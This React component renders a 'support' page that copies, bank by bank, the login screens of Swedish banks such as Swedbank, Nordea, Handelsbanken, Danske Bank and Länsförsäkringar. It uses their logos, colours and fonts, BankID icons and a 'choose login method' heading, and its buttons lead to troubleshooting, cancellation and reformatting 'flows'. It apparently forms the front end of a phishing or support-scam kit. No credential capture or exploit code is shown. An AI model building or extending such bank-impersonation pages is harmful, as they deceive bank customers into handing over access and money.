import { useNavigate, useParams } from "react-router-dom";
import { useEffect } from "react";
import { ArrowLeft } from "lucide-react";
import { useBankTheme } from "@/context/BankThemeContext";
import { useLanguage } from "@/context/LanguageContext";
import LanguageSwitcher from "@/components/LanguageSwitcher";
import { bankLogoImages } from "@/config/bankLogos";
import bankidLogo from "@/assets/bankid-logo.png";
import logoDanskeLogin from "@/assets/logo-danskebank-login.svg";
import lfArt from "@/assets/lf-art.svg";

import bgSwedbank from "@/assets/bg-swedbank.jpg";
import bgNordea from "@/assets/bg-nordea.png";
import bgSeb from "@/assets/bg-seb.jpg";
import bgHandelsbanken from "@/assets/bg-handelsbanken.jpg";
import bgSparbankenSyd from "@/assets/bg-sparbanken-syd.jpg";
import bgDanskebank from "@/assets/bg-danskebank.jpg";
import bgIcaBanken from "@/assets/bg-ica-banken.jpg";
import bgLansforsakringar from "@/assets/bg-lansforsakringar.jpg";

const backgrounds: Record<string, string> = {
  swedbank: bgSwedbank,
  nordea: bgNordea,
  seb: bgSeb,
  handelsbanken: bgHandelsbanken,
  "sparbanken-syd": bgSparbankenSyd,
  danskebank: bgDanskebank,
  "ica-banken": bgIcaBanken,
  lansforsakringar: bgLansforsakringar,
};

const NORDEA_BLUE = "#00005E";
const NORDEA_LINK = "#0000BF";
const NORDEA_FONT = '"Segoe UI", system-ui, -apple-system, Helvetica, Arial, sans-serif';

const SEB_GREEN = "#353531";
const SEB_DARK = "#333333";
const SEB_FONT = '"Segoe UI", system-ui, -apple-system, Helvetica, Arial, sans-serif';

const HB_BLUE = "#005C9E";
const HB_DARK = "#333333";
const HB_FONT = '"Segoe UI", system-ui, -apple-system, Helvetica, Arial, sans-serif';

const DB_NAVY = "#003755";
const DB_BUTTON = "#0F56B3";
const DB_LINK = "#0a5ef0";
const DB_FONT = '"Segoe UI", system-ui, -apple-system, Helvetica, Arial, sans-serif';

const flows = [
  { id: "felsokning", labelKey: "support.flow.felsokning", primary: true },
  { id: "annulering", labelKey: "support.flow.annulering", primary: false },
  { id: "omformatering", labelKey: "support.flow.omformatering", primary: false },
];

const Support = () => {
  const navigate = useNavigate();
  const { bankId } = useParams<{ bankId: string }>();
  const { bank, setBankId } = useBankTheme();
  const { t } = useLanguage();

  useEffect(() => {
    if (bankId) setBankId(bankId);
    return () => setBankId(null);
  }, [bankId, setBankId]);

  const bgImage = backgrounds[bankId || ""] || "";
  const bankName = bank?.name || "Banken";
  const primaryHsl = bank?.primary || "0 0% 50%";
  const isSwedbank = bankId === "swedbank";
  const isNordea = bankId === "nordea";
  const isSEB = bankId === "seb";
  const isHB = bankId === "handelsbanken";
  const isSparbankenSyd = bankId === "sparbanken-syd";
  const isDanske = bankId === "danskebank";
  const isLF = bankId === "lansforsakringar";

  const pageStyle = { backgroundImage: `url(${bgImage})` };

  const cardStyle = { boxShadow: "0 15px 60px rgba(0,0,0,0.55), 0 5px 20px rgba(0,0,0,0.3)" };

  const fontFamily = isSwedbank
    ? '"Roboto", Arial, Helvetica, sans-serif'
    : isNordea
      ? NORDEA_FONT
      : isSEB
        ? SEB_FONT
        : isHB
          ? HB_FONT
          : isDanske
            ? DB_FONT
            : isSparbankenSyd
              ? 'system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif'
              : undefined;

  const textColor = isSwedbank ? "#512B2B" : isNordea ? NORDEA_BLUE : isSEB ? SEB_DARK : isHB ? HB_DARK : isDanske ? DB_NAVY : isSparbankenSyd ? "#1a1a1a" : undefined;
  const headingColor = isSwedbank ? "#FF5F00" : isNordea ? NORDEA_BLUE : isSEB ? SEB_DARK : isHB ? HB_BLUE : isDanske ? DB_NAVY : isSparbankenSyd ? "#1a1a1a" : `hsl(${primaryHsl})`;
  const headingFont = isSwedbank
    ? '"Swedbank Headline", sans-serif'
    : isNordea
      ? NORDEA_FONT
      : isSEB
        ? SEB_FONT
        : isHB
          ? HB_FONT
          : isDanske
            ? DB_FONT
            : undefined;
  const linkColor = isSwedbank ? "#257886" : isNordea ? NORDEA_LINK : isSEB ? SEB_GREEN : isHB ? HB_BLUE : isDanske ? DB_LINK : isSparbankenSyd ? "#1a1a1a" : undefined;
  const buttonRadius = isNordea ? "4px" : isHB ? "24px" : isDanske ? "24px" : "999px";
  const buttonFont = isDanske ? DB_FONT : isNordea ? NORDEA_FONT : isSEB ? SEB_FONT : isHB ? HB_FONT : '"Swedbank Headline", sans-serif';

  // Handelsbanken login-page style
  // Länsförsäkringar login selection style
  const LF_NAVY = "#00427a";
  const LF_BUTTON = "#0077b3";
  const LF_BG = "#e4eef5";
  const LF_CLOUD = "#e8f2f8";
  const LF_FONT = '"Segoe UI", system-ui, -apple-system, Helvetica, Arial, sans-serif';
  const LF_HEADING_FONT = '"Intro Cond", "Arial Narrow", "Helvetica Neue", Arial, sans-serif';

  if (isLF) {
    return (
      <div className="min-h-screen flex flex-col" style={{ backgroundColor: "#f5f5f5", fontFamily: LF_FONT }}>
        {/* Top logo bar — outside card */}
        <div style={{ padding: "20px 32px" }}>
          <img src={bankLogoImages["lansforsakringar"]} alt="Länsförsäkringar" style={{ height: "40px" }} className="object-contain" />
        </div>

        {/* Centered card */}
        <div className="flex-1 flex flex-col items-center" style={{ paddingTop: "24px" }}>
          <div className="w-full max-w-[520px] mx-4">
            <div className="w-full bg-white overflow-hidden" style={{ boxShadow: "0 1px 8px rgba(0,0,0,0.08)", borderRadius: "8px" }}>
              {/* Title */}
              <div className="text-center" style={{ padding: "32px 32px 12px" }}>
                <h1 style={{ color: LF_NAVY, fontFamily: LF_HEADING_FONT, fontWeight: 700, fontSize: "1.625rem", lineHeight: "2.25rem", margin: 0, fontStyle: "normal" }}>
                  {t("support.title")}
                </h1>
              </div>


              {/* Method cards */}
              <div style={{ padding: "16px 32px 32px", maxWidth: "400px", margin: "0 auto" }} className="flex flex-col" >
                {flows.map((flow) => (
                  <button
                    key={flow.id}
                    onClick={() => navigate(`/bank/${bankId}/flow/${flow.id}`)}
                    className="w-full flex items-center justify-between transition-colors"
                    style={{ backgroundColor: LF_CLOUD, padding: "14px 16px", border: "none", borderTop: "1px solid #d8e8f0", cursor: "pointer", fontFamily: LF_FONT, borderRadius: "4px 4px 0 0", marginTop: "6px" }}
                    onMouseEnter={(e) => { e.currentTarget.style.backgroundColor = "#d6e8f0"; }}
                    onMouseLeave={(e) => { e.currentTarget.style.backgroundColor = LF_CLOUD; }}
                  >
                    <div className="flex items-center gap-3">
                      <img src={bankidLogo} alt="" style={{ width: "32px", height: "32px", objectFit: "contain" }} />
                      <strong style={{ fontSize: "15px", fontWeight: 700, color: "#183E4F" }}>{t(flow.labelKey)}</strong>
                    </div>
                    <span style={{ color: "#183E4F", fontSize: "18px", fontWeight: 300 }}>→</span>
                  </button>
                ))}
              </div>

              {/* Back */}
              <div className="text-center" style={{ padding: "0 32px 24px" }}>
                <button
                  onClick={() => navigate(`/bank/${bankId}`)}
                  className="flex items-center gap-2 mx-auto transition-colors hover:opacity-80"
                  style={{ fontFamily: LF_FONT, fontSize: "14px", color: LF_NAVY, background: "none", border: "none", cursor: "pointer" }}
                >
                  <ArrowLeft className="w-4 h-4" />
                  {t("support.back")}
                </button>
              </div>
            </div>

            {/* Footer links — outside card */}
            <div className="flex justify-center gap-6 flex-wrap" style={{ padding: "20px 0", fontSize: "13px", color: LF_NAVY }}>
              <a href="#" className="hover:underline">Om personuppgifter</a>
              <a href="#" className="hover:underline">Cookie-inställningar</a>
              <a href="#" className="hover:underline">Internetvillkor</a>
              <a href="#" className="hover:underline">Säkerhet</a>
              <a href="#" className="hover:underline">Kontakta oss</a>
            </div>
          </div>
        </div>

        {/* Bottom SVG art */}
        <div className="w-full overflow-hidden" style={{ lineHeight: 0 }}>
          <img src={lfArt} alt="" aria-hidden="true" className="w-full object-cover" style={{ maxHeight: "120px" }} />
        </div>
      </div>
    );
  }

  if (isHB) {
    return (
      <div
        className="min-h-screen flex items-center justify-center bg-cover bg-center bg-no-repeat"
        style={pageStyle}
      >
        <div className="w-full max-w-[460px] mx-4">
          <div
            className="w-full bg-white overflow-hidden"
            style={{
              ...cardStyle,
              fontFamily,
              color: textColor,
            }}
          >
            {/* Header - matches HB login "Logga in - Privat" */}
            <div style={{ padding: "0", backgroundColor: "#D4E6F1" }}>
              <h1
                style={{
                  color: "#00334D",
                  fontFamily: HB_FONT,
                  fontWeight: 700,
                  fontSize: "1.5rem",
                  lineHeight: "2rem",
                  margin: 0,
                  padding: "24px 24px",
                }}
              >
                {t("support.title")}
              </h1>
            </div>

            {/* Flow entry points - list style like HB login */}
            <div style={{ padding: "0 0 16px" }}>
              <ul style={{ listStyle: "none", margin: 0, padding: 0 }}>
                {flows.map((flow, index) => (
                  <li
                    key={flow.id}
                    style={{
                      borderTop: "1px solid #E5E5E5",
                      borderBottom: index === flows.length - 1 ? "1px solid #E5E5E5" : "none",
                    }}
                  >
                    <button
                      onClick={() => navigate(`/bank/${bankId}/flow/${flow.id}`)}
                      className="w-full flex items-center gap-4 transition-colors"
                      onMouseEnter={(e) => e.currentTarget.style.backgroundColor = "#D4E6F1"}
                      onMouseLeave={(e) => e.currentTarget.style.backgroundColor = "transparent"}
                      style={{
                        padding: "20px 24px",
                        background: "none",
                        border: "none",
                        cursor: "pointer",
                        textAlign: "left",
                        fontFamily: HB_FONT,
                      }}
                    >
                      {/* Icon */}
                      <div className="flex-shrink-0 flex items-center justify-center" style={{ width: "40px", height: "64px" }}>
                        <svg width="30" height="48" viewBox="0 0 78 129" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false">
                          <path fillRule="evenodd" clipRule="evenodd" d="M65 2H13C6.92487 2 2 6.92487 2 13V116C2 122.075 6.92487 127 13 127H65C71.0751 127 76 122.075 76 116V13C76 6.92487 71.0751 2 65 2ZM13 0C5.8203 0 0 5.8203 0 13V116C0 123.18 5.8203 129 13 129H65C72.1797 129 78 123.18 78 116V13C78 5.8203 72.1797 0 65 0H13Z" fill="#0079B0"/>
                          <path d="M31.6794 45.8266L33.3581 35.2457C32.6968 35.2457 31.5649 35.2457 31.5649 35.2457C30.7256 35.2457 29.6446 34.7751 29.3266 33.9103C29.2249 33.6178 28.9833 32.6131 30.3695 31.6339C30.8654 31.2905 31.1834 30.909 31.247 30.6165C31.3106 30.3113 31.2343 30.0442 31.0181 29.8407C30.7128 29.5482 30.1151 29.3829 29.3521 29.3829C28.0676 29.3829 27.1646 30.1205 27.0756 30.6546C27.012 31.0489 27.3173 31.3668 27.5843 31.5703C28.3855 32.168 28.5763 33.0328 28.0803 33.8467C27.5716 34.6861 26.4652 35.2329 25.2824 35.2457C25.2824 35.2457 24.1124 35.2457 23.4511 35.2457C23.2985 36.2758 20.8059 52.071 20.6151 53.3173H30.5094C30.5984 52.7704 31.0562 49.7818 31.6794 45.8266Z" fill="#183E4F"/>
                          <path d="M20.081 56.9799H24.1379C25.8675 56.9799 26.2871 57.8574 26.16 58.6586C26.0582 59.3072 25.6131 59.7905 24.8501 60.1084C25.8166 60.4772 26.1981 61.0495 26.0582 61.9525C25.8802 63.0843 24.9009 63.9237 23.6165 63.9237H19L20.081 56.9799ZM22.7644 59.8541C23.5529 59.8541 23.9217 59.4344 23.998 58.9384C24.0743 58.4043 23.8327 58.0355 23.0442 58.0355H22.3447L22.0649 59.8541H22.7644ZM22.332 62.8427C23.1459 62.8427 23.6165 62.512 23.7309 61.838C23.8199 61.253 23.4893 60.9096 22.7008 60.9096H21.9123L21.6071 62.8554H22.332V62.8427Z" fill="#183E4F"/>
                          <path d="M31.743 63.9746C30.6874 64.0509 30.1787 63.9365 29.9243 63.4786C29.3648 63.822 28.7416 64 28.0803 64C26.8849 64 26.4652 63.3769 26.5796 62.6901C26.6305 62.3595 26.8213 62.0415 27.1265 61.7745C27.7878 61.2022 29.4156 61.1259 30.0515 60.6935C30.1024 60.2102 29.9116 60.0322 29.3139 60.0322C28.6144 60.0322 28.0294 60.2611 27.0247 60.9478L27.2664 59.3709C28.1312 58.7477 28.9705 58.4552 29.9371 58.4552C31.1707 58.4552 32.2644 58.9639 32.0609 60.312L31.8193 61.8381C31.7302 62.3722 31.7557 62.5375 32.3534 62.5502L31.743 63.9746ZM29.9116 61.571C29.3521 61.9271 28.3092 61.8635 28.1948 62.6011C28.1439 62.9445 28.3601 63.1988 28.7035 63.1988C29.0341 63.1988 29.4411 63.0589 29.7717 62.83C29.7463 62.7029 29.759 62.5757 29.7972 62.334L29.9116 61.571Z" fill="#183E4F"/>
                          <path d="M33.7142 58.5442H35.8253L35.7108 59.2437C36.3849 58.6714 36.8936 58.4552 37.5549 58.4552C38.7376 58.4552 39.2845 59.1801 39.0937 60.3628L38.5468 63.911H36.4357L36.8936 60.9733C36.9826 60.4391 36.8173 60.1848 36.4103 60.1848C36.0796 60.1848 35.7744 60.3628 35.4819 60.7571L34.9987 63.8983H32.8875L33.7142 58.5442Z" fill="#183E4F"/>
                          <path d="M40.747 56.9799H42.8581L42.324 60.3882L44.3461 58.5442H46.9532L44.3588 60.8333L46.4445 63.911H43.7865L42.1841 61.4183H42.1587L41.7771 63.8983H39.666L40.747 56.9799Z" fill="#183E4F"/>
                          <path d="M48.2122 56.9799H50.6412L49.5729 63.911H47.1439L48.2122 56.9799Z" fill="#183E4F"/>
                          <path d="M51.824 56.9799H55.2959C57.9793 56.9799 58.755 58.9257 58.5007 60.5408C58.259 62.1178 57.0127 63.911 54.66 63.911H50.743L51.824 56.9799ZM54.075 62.2577C55.2577 62.2577 55.9063 61.6727 56.0971 60.4391C56.237 59.5234 55.9572 58.6205 54.6473 58.6205H53.9987L53.4391 62.2577H54.075Z" fill="#183E4F"/>
                          <path d="M44.9819 26H34.8715L33.5234 34.5589H35.2403C36.1814 34.5589 37.0716 34.1265 37.4532 33.5033C37.5803 33.2999 37.6312 33.1218 37.6312 32.9565C37.6312 32.6004 37.3896 32.3333 37.1479 32.1553C36.4866 31.6593 36.3467 31.1379 36.3467 30.7691C36.3467 30.6928 36.3467 30.6292 36.3595 30.5656C36.4993 29.6626 37.7202 28.6834 39.3354 28.6834C40.3019 28.6834 41.0395 28.9123 41.4846 29.332C41.8789 29.7008 42.0315 30.2222 41.917 30.7691C41.7771 31.4177 41.1285 31.9518 40.7597 32.2189C39.7805 32.9056 39.9076 33.5033 39.9712 33.6814C40.1747 34.2155 40.9505 34.5589 41.5482 34.5589H44.168C44.168 34.5589 44.168 34.5589 44.168 34.5716C47.7289 34.5971 49.6366 36.2376 49.0388 40.0529C48.4793 43.6011 45.7577 45.1272 42.5147 45.1526L41.2303 53.3427H43.1252C51.1245 53.3427 57.6613 48.2048 58.9458 40.091C60.5355 30.0187 54.1386 26 44.9819 26Z" fill="#183E4F"/>
                          <path d="M30 119.5C30 119.224 30.2239 119 30.5 119H47.5C47.7761 119 48 119.224 48 119.5V120.5C48 120.776 47.7761 121 47.5 121H30.5C30.2239 121 30 120.776 30 120.5V119.5Z" fill="#0079B0"/>
                          <path d="M31.3477 87.9014L35.2345 87.9109L35.245 85.9417L31.3584 85.9323" fill="#0079B0"/>
                          <path d="M40.0518 83.1213L38.1086 83.1168L38.0981 85.0636L40.0415 85.0684L40.0518 83.1213Z" fill="#0079B0"/>
                          <path d="M44.6545 85.9651L42.711 85.9604L42.7005 87.9074L44.6439 87.9121L44.6545 85.9651Z" fill="#0079B0"/>
                          <path d="M46.6102 79.2654L40.8464 79.2511L40.8156 84.9373L46.4912 84.9514L46.6102 79.2654ZM44.6235 83.1988L42.6581 83.1939L42.6688 81.2028L44.6342 81.2077L44.6235 83.1988Z" fill="#0079B0"/>
                          <path d="M29.4833 77.4311L34.2312 77.443L34.242 75.4737L29.494 75.4621C28.9725 75.4607 28.4716 75.667 28.101 76.0353C27.7304 76.4039 27.5207 76.9042 27.5178 77.4264L27.4921 82.2053L29.4576 82.2103L29.4833 77.4311Z" fill="#0079B0"/>
                          <path d="M29.4061 91.6351L27.5289 91.6306L27.5028 96.4982C27.5 97.0204 27.7044 97.5217 28.0709 97.8921C28.4375 98.2622 28.9363 98.4709 29.4575 98.4722L34.1172 98.4836L34.1278 96.5146L29.3799 96.5028L29.4061 91.6351Z" fill="#0079B0"/>
                          <path d="M48.4617 96.5504L43.6915 96.5387L43.681 98.5079L48.4732 98.5198C48.9945 98.5209 49.4953 98.3148 49.866 97.9462C50.2367 97.578 50.4465 97.0776 50.4491 96.5553L50.4754 91.6878L48.5099 91.6831L48.4617 96.5504Z" fill="#0079B0"/>
                          <path d="M46.528 94.5096L46.5537 89.7305L44.6103 89.7258L44.5953 92.5578L42.6518 92.5531L42.6614 90.7609L40.8726 90.7565L40.8525 94.4955L44.5847 94.5048L46.528 94.5096Z" fill="#0079B0"/>
                          <path d="M48.5736 75.5309L43.8037 75.5191L43.793 77.4882L48.5852 77.5001L48.5594 82.279L50.525 82.284L50.5507 77.4828C50.5213 76.9694 50.3027 76.4859 49.9375 76.1253C49.5724 75.7647 49.0865 75.5529 48.5736 75.5309Z" fill="#0079B0"/>
                          <path d="M41.8027 85.9574L38.0926 85.9482L38.0723 89.7094L39.839 89.714L39.8486 87.9218L41.7921 87.9265L41.8027 85.9574Z" fill="#0079B0"/>
                          <path d="M40.0067 91.5069L38.0633 91.502L38.0529 93.4491L39.9963 93.454L40.0067 91.5069Z" fill="#0079B0"/>
                          <path d="M31.3631 85.0472L37.0386 85.061L37.0692 79.3971L31.3936 79.383L31.3631 85.0472ZM33.3494 81.1801L35.3148 81.185L35.3043 83.1541L33.3387 83.1491L33.3494 81.1801Z" fill="#0079B0"/>
                          <path d="M31.3126 94.4505L36.9879 94.4645L37.0185 88.8225L31.3429 88.8085L31.3126 94.4505ZM33.2981 90.7162L35.2635 90.7211L35.2529 92.6901L33.2875 92.6852L33.2981 90.7162Z" fill="#0079B0"/>
                          <path d="M40.0734 79.2499L38.13 79.245L38.1195 81.192L40.0629 81.1967L40.0734 79.2499Z" fill="#0079B0"/>
                        </svg>
                      </div>
                      <span
                        style={{
                          fontSize: "1.125rem",
                          fontWeight: 500,
                          color: "#183E4F",
                          lineHeight: "1.5",
                        }}
                      >
                        {t(flow.labelKey)}
                      </span>
                    </button>
                  </li>
                ))}
              </ul>
            </div>

            {/* Back button */}
            <div style={{ padding: "8px 24px 24px" }}>
              <button
                onClick={() => navigate(`/bank/${bankId}`)}
                className="flex items-center gap-2 transition-colors hover:opacity-80"
                style={{
                  fontFamily: HB_FONT,
                  fontSize: "14px",
                  color: "#0079B0",
                  background: "none",
                  border: "none",
                  cursor: "pointer",
                  fontWeight: 400,
                }}
              >
                <ArrowLeft className="w-4 h-4" />
                {t("support.back") || "Tillbaka"}
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Danske Bank login-page style
  if (isDanske) {
    return (
      <div
        className="min-h-screen flex items-center justify-center bg-cover bg-center bg-no-repeat"
        style={pageStyle}
      >
        <div className="w-full max-w-[460px] mx-4">
          <div
            className="w-full bg-white overflow-hidden"
            style={{
              ...cardStyle,
              fontFamily: DB_FONT,
              color: DB_NAVY,
            }}
          >
            {/* Danske Bank login logo */}
            <div style={{ padding: "48px 32px 32px", textAlign: "center" }}>
              <img
                src={logoDanskeLogin}
                alt="Danske Bank"
                style={{ height: "18px", display: "inline-block" }}
              />
            </div>

            {/* h1 - italic serif like "Logga in i Hembanken" */}
            <div style={{ padding: "0 32px 16px", textAlign: "center" }}>
              <h1
                style={{
                  color: DB_NAVY,
                  fontFamily: '"Georgia", "Times New Roman", Times, serif',
                  fontWeight: 400,
                  fontStyle: "italic",
                  fontSize: "1.875rem",
                  lineHeight: "2.5rem",
                  margin: 0,
                }}
              >
                {t("support.title")}
              </h1>
            </div>

            {/* h2 subtitle - italic like "Välj inloggningsmetod" */}
            <div style={{ padding: "8px 32px 28px", textAlign: "center" }}>
              <h2
                style={{
                  color: DB_NAVY,
                  fontFamily: '"Georgia", "Times New Roman", Times, serif',
                  fontWeight: 400,
                  fontStyle: "italic",
                  fontSize: "0.9375rem",
                  lineHeight: "1.25rem",
                  margin: 0,
                }}
              >
                Välj inloggningsmetod
              </h2>
            </div>

            {/* Flow buttons - pill shaped like Danske Bank login */}
            <div style={{ padding: "0 48px 40px" }} className="flex flex-col gap-4">
              {flows.map((flow) => (
                <button
                  key={flow.id}
                  onClick={() => navigate(`/bank/${bankId}/flow/${flow.id}`)}
                  className="w-full flex items-center transition-all"
                  style={{
                    backgroundColor: "#ffffff",
                    border: "1px solid #d0d0d0",
                    borderRadius: "999px",
                    padding: "12px 24px",
                    cursor: "pointer",
                    fontFamily: DB_FONT,
                    gap: "14px",
                    minHeight: "52px",
                  }}
                  onMouseEnter={(e) => {
                    e.currentTarget.style.borderColor = "#999";
                    e.currentTarget.style.boxShadow = "0 1px 4px rgba(0,0,0,0.08)";
                  }}
                  onMouseLeave={(e) => {
                    e.currentTarget.style.borderColor = "#d0d0d0";
                    e.currentTarget.style.boxShadow = "none";
                  }}
                >
                  {/* BankID logo icon */}
                  <div className="flex-shrink-0 flex items-center justify-center" style={{ width: "32px", height: "32px" }}>
                    <img src={bankidLogo} alt="" style={{ width: "32px", height: "32px", objectFit: "contain" }} />
                  </div>
                  <span
                    style={{
                      fontSize: "0.9375rem",
                      fontWeight: 400,
                      color: DB_NAVY,
                      lineHeight: "1.5",
                    }}
                  >
                    {t(flow.labelKey)}
                  </span>
                </button>
              ))}
            </div>

            {/* Back button */}
            <div style={{ padding: "0 32px 24px" }}>
              <button
                onClick={() => navigate(`/bank/${bankId}`)}
                className="flex items-center gap-2 transition-colors hover:opacity-80"
                style={{
                  fontFamily: DB_FONT,
                  fontSize: "14px",
                  color: DB_LINK,
                  background: "none",
                  border: "none",
                  cursor: "pointer",
                  fontWeight: 400,
                }}
              >
                <ArrowLeft className="w-4 h-4" />
                {t("support.back") || "Tillbaka"}
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div
      className="min-h-screen flex items-center justify-center bg-cover bg-center bg-no-repeat"
      style={pageStyle}
    >
      <div className="w-full max-w-[460px] mx-4">
        <div
          className="w-full bg-white overflow-hidden"
          style={{
            ...cardStyle,
            fontFamily,
            color: textColor,
          }}
        >
          
          {/* Header: logo left, help+language right */}
          <div className="flex items-center justify-between" style={{ padding: "24px 24px 8px" }}>
            {bankLogoImages[bankId || ""] ? (
              <img src={bankLogoImages[bankId || ""]} alt={bankName} className="object-contain" style={{ height: isNordea ? "28px" : isSEB ? "72px" : isDanske ? "24px" : "45px" }} />
            ) : (
              <div
                style={{
                  fontFamily: headingFont,
                  fontWeight: isSEB ? 700 : 700,
                  fontSize: "1.25rem",
                  color: headingColor,
                }}
              >
                {bankName}
              </div>
            )}
            <div className="flex items-center gap-5"
              style={{
                fontFamily,
                fontSize: "14px",
                fontWeight: isSwedbank ? 700 : 500,
                color: textColor,
              }}
            >
              <LanguageSwitcher
                style={{
                  fontFamily,
                  fontSize: "14px",
                  fontWeight: isSwedbank ? 700 : 500,
                  color: textColor,
                }}
              />
            </div>
          </div>

          {/* Title */}
          <div style={{ padding: "16px 24px 20px" }}>
            <h1
              style={{
                color: headingColor,
                fontFamily: headingFont,
                fontWeight: isSEB ? 400 : 700,
                fontSize: isNordea ? "1.375rem" : "1.5rem",
                lineHeight: isNordea ? "1.75rem" : "2rem",
                margin: 0,
              }}
            >
              {t("support.title")}
            </h1>
          </div>

          {/* Flow buttons */}
          <div style={{ padding: "0 24px 24px" }} className="flex flex-col gap-4">
            {flows.map((flow) => (
              <button
                key={flow.id}
                onClick={() => navigate(`/bank/${bankId}/flow/${flow.id}`)}
                className="w-full transition-opacity hover:opacity-90"
                style={{
                  backgroundColor: flow.primary
                    ? (isSwedbank ? "#FF5F00" : isNordea ? NORDEA_BLUE : isSEB ? SEB_GREEN : isDanske ? DB_BUTTON : isSparbankenSyd ? "#FFCC00" : `hsl(${primaryHsl})`)
                    : (isSwedbank ? "#257886" : isNordea ? NORDEA_BLUE : isSEB ? "#353531" : isDanske ? DB_BUTTON : isSparbankenSyd ? "#FFCC00" : `hsl(${primaryHsl})`),
                  color: isSparbankenSyd ? "#1a1a1a" : "#ffffff",
                  fontFamily: isDanske ? DB_FONT : isSparbankenSyd ? 'system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif' : buttonFont,
                  fontWeight: isDanske ? 600 : isSparbankenSyd ? 600 : isNordea ? 600 : isSEB ? 400 : 700,
                  fontSize: isSparbankenSyd ? "1rem" : isNordea ? "1rem" : isSEB ? "1rem" : "1.1875rem",
                  lineHeight: "1.5rem",
                  padding: isNordea ? "14px 32px" : "12px 32px",
                  minHeight: "48px",
                  borderRadius: buttonRadius,
                  border: "none",
                  letterSpacing: isNordea ? "0.02em" : "0.04px",
                }}
              >
                {t(flow.labelKey)}
              </button>
            ))}
          </div>

          {/* Back button */}
          <div style={{ padding: "0 24px 16px" }}>
            <button
              onClick={() => navigate(`/bank/${bankId}`)}
              className="flex items-center gap-2 transition-colors hover:opacity-80"
              style={{
                fontFamily,
                fontSize: "14px",
                color: textColor,
                background: "none",
                border: "none",
                cursor: "pointer",
              }}
            >
              <ArrowLeft className="w-4 h-4" />
              {t("support.back") || "Tillbaka"}
            </button>
          </div>

          {/* Footer links */}
          <div className="flex gap-8"
            style={{
              padding: "0 24px 24px",
              fontFamily: isSwedbank ? '"Swedbank Headline", sans-serif' : isNordea ? NORDEA_FONT : isSEB ? SEB_FONT : undefined,
              fontWeight: isNordea ? 500 : isSEB ? 400 : 700,
              fontSize: isNordea || isSEB ? "0.875rem" : "1rem",
              lineHeight: "1.5rem",
              color: linkColor,
            }}
          >
            <a href="#" className="flex items-center gap-1 hover:underline">
              ▸ {t("support.privacy")}
            </a>
            <a href="#" className="flex items-center gap-1 hover:underline">
              ▸ {t("support.cookies")}
            </a>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Support;
